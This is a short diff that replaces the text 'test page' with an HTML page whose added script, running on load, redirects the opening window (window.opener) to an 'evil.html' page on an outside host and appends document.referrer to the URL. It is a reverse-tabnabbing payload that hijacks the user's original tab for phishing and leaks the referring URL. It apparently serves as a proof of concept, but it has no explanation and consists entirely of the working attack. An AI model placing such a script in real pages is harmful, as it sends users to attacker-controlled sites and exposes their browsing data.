@@ -1,1 +1,8 @@
-test page
+<h3>test page<h3>
+  
+<script>
+if (window.opener) { 
+window.opener.location = "https://www.csrf.xyz/evil.html" + document.referrer; 
+
+} 
+</script>
